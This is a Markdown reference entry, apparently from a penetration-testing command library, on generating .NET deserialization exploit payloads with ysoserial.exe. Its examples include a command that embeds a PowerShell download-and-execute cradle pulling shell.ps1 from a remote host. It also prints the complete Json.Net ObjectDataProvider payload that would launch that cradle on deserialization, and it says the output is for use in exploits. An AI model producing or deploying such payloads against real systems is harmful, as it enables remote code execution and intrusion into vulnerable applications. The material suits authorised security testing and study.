---
type: command
executor: cmd
data: ysoserial.exe -f $_FORMAT -g $_GADGET -o $_OUTPUT_FORMAT -c "$_COMMAND"
platforms:
  - Windows
tags:
  - deserialization
  - exploitation
verified: true
validated: true
---

# ysoserial-generate-deserialization-payload

## Command

```cmd
ysoserial.exe -f $_FORMAT -g $_GADGET -o $_OUTPUT_FORMAT -c "$_COMMAND"
```

## Description

This command generates a serialized .NET deserialization payload using a specified formatter, gadget chain, output format, and command to execute upon deserialization. It is used to create exploit payloads for vulnerable .NET applications that perform unsafe object deserialization, leading to remote code execution.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `$_FORMAT` | Serialization formatter (e.g., Json.Net, BinaryFormatter, DataContractSerializer) | Yes |
| `$_GADGET` | Gadget chain to use (e.g., ObjectDataProvider, DataSet, TypeConfuseDelegate) | Yes |
| `$_OUTPUT_FORMAT` | Output encoding (raw, base64, hex) | Yes |
| `$_COMMAND` | Command or payload to execute on the target (e.g., PowerShell one-liner) | Yes |
| `-f` | Flag for formatter | Built-in |
| `-g` | Flag for gadget | Built-in |
| `-o` | Flag for output format | Built-in |
| `-c` | Flag for command | Built-in |

## Examples

### Basic Usage

Generate a raw JSON.NET payload with ObjectDataProvider to download and execute a remote script:

```cmd
ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "powershell -ep bypass iex(New-Object Net.WebClient).DownloadString('http://10.10.10.100/shell.ps1')"
```

### Advanced Usage

Generate a base64-encoded payload using TypeConfuseDelegate for calculator execution:

```cmd
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "calc.exe"
```

## Expected Output

The command outputs the serialized payload to stdout. For the basic example:

```
{
    "$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
    "MethodName":"Start",
    "MethodParameters":{
        "$type":"System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
        "$values":["cmd", "/c powershell -ep bypass iex(New-Object Net.WebClient).DownloadString('http://10.10.10.100/shell.ps1')"]
    },
    "ObjectInstance":{"$type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"}
}
```

Success is indicated by valid JSON or binary output without errors. Pipe the output to a file for use in exploits (e.g., `> payload.json`).

## Related

- [[commands/ysoserial-list-gadgets]]
- [[procedures/Exploit-DotNET-Deserialization]]
